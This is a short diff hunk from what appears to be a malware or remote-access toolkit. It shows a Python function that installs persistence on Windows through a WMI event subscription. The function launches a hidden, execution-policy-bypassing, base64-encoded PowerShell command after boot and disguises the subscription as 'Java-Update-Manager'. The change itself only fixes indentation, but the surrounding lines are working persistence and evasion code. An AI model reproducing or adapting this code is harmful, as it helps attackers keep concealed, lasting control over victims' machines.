@@ -229,7 +229,7 @@ def _add_powershell_wmi(command=None, name='Java-Update-Manager'):
             if command:
                 cmd_line = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
                 startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
-        		script = globals()['__Template_wmi'].replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
+                script = globals()['__Template_wmi'].replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
                 _ = util.powershell(script)
                 code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
                 result = util.powershell(code)
